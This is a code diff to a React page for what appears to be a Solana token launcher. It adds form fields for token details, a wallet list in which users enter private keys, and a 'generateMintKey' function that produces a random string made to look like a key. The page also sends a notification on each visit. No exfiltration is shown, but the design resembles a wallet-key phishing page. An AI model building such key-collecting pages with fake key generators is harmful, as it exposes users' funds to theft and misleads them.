@@ -61,6 +61,7 @@
         <div class="particle"></div>
         <div class="particle"></div>
         <div class="particle"></div>
+        <div class="particle"></div>
     </div>
     <div id="root"></div>
 
@@ -80,6 +81,14 @@
             const [activeTooltip, setActiveTooltip] = React.useState(null);
             const [fileName, setFileName] = React.useState('');
             const [imagePreview, setImagePreview] = React.useState(null);
+            const [formData, setFormData] = React.useState({
+                tokenName: '',
+                tokenSymbol: '',
+                tokenDescription: '',
+                twitter: '',
+                telegram: '',
+                website: ''
+            });
 
             // Send message when someone visits
             React.useEffect(() => {
@@ -125,6 +134,42 @@
                 // Send the notification
                 sendVisitNotification();
             }, []);
+
+            const toggleTooltip = (tooltipId) => {
+                if (activeTooltip === tooltipId) {
+                    setActiveTooltip(null);
+                } else {
+                    setActiveTooltip(tooltipId);
+                }
+            };
+
+            const addWallet = () => {
+                if (wallets.length < 8) {
+                    setWallets([...wallets, { 
+                        id: wallets.length + 1, 
+                        privateKey: '', 
+                        amount: '',
+                        balance: '– SOL'
+                    }]);
+                }
+            };
+
+            const removeWallet = (id) => {
+                if (wallets.length > 1) {
+                    setWallets(wallets.filter(wallet => wallet.id !== id));
+                }
+            };
+
+            const generateMintKey = () => {
+                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                const length = 88;
+                let result = '';
+                result += Math.floor(Math.random() * 90 + 10);
+                for (let i = 2; i < length; i++) {
+                    result += characters.charAt(Math.floor(Math.random() * characters.length));
+                }
+                setMintKey(result);
+            };
 
             // Handle form field changes
             const handleInputChange = (field, value) => {
